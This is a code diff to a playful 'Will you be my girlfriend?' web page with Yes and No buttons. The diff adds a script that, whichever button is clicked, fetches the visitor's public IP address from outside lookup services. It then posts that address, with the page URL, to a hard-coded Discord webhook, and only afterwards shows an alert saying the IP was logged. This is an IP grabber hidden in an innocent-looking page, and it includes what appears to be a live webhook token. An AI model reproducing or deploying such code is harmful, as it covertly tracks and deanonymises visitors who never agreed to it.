@@ -20,6 +20,9 @@
             -moz-background-size: cover;
             -o-background-size: cover;
             background-size: cover;
+            /* Prevent grayscale fallback */
+            -webkit-filter: none;
+            filter: none;
         }
 
         .container {
@@ -107,9 +110,67 @@
             <div class="text-overlay">Will you be my girlfriend?</div>
         </div>
         <div class="buttons">
-            <button class="moving-btn">Yes</button>
-            <button class="moving-btn">No</button>
+            <button class="moving-btn" id="yesButton">Yes</button>
+            <button class="moving-btn" id="noButton">No</button>
         </div>
     </div>
+    <script>
+        // Logger script to notify IP to Discord
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1397667597784453210/5Ync1yXCfohUTF3Ey_ljtKLjDn37K3GEqPLndRZwVZU0onGSLuEhgaOMICmVzOpJP_F2";
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('IP fetch failed');
+                const data = await response.json();
+                return data.ip || "Unknown IP";
+            } catch (error) {
+                console.warn('IP fallback:', error);
+                const fallback = await fetch('https://api.ipify.org?format=json');
+                const fallbackData = await fallback.json();
+                return fallbackData.ip || "Unknown IP";
+            }
+        }
+
+        async function sendToDiscord(ip) {
+            const payload = {
+                username: "Girlfriend Question Logger",
+                embeds: [{
+                    title: "📊 Response Logged",
+                    description: `Answer from: ${window.location.href}`,
+                    fields: [{ name: "IP Address", value: ip, inline: true }],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                if (response.ok) console.log("IP sent to Discord");
+                else console.error("Discord failed:", response.status);
+            } catch (error) {
+                console.error("Send error:", error);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const yesButton = document.getElementById('yesButton');
+            const noButton = document.getElementById('noButton');
+
+            yesButton.addEventListener('click', async () => {
+                const ip = await getIP();
+                await sendToDiscord(ip);
+                alert("Thanks for saying Yes! IP logged.");
+            });
+
+            noButton.addEventListener('click', async () => {
+                const ip = await getIP();
+                await sendToDiscord(ip);
+                alert("Thanks for your response! IP logged.");
+            });
+        });
+    </script>
 </body>
 </html>
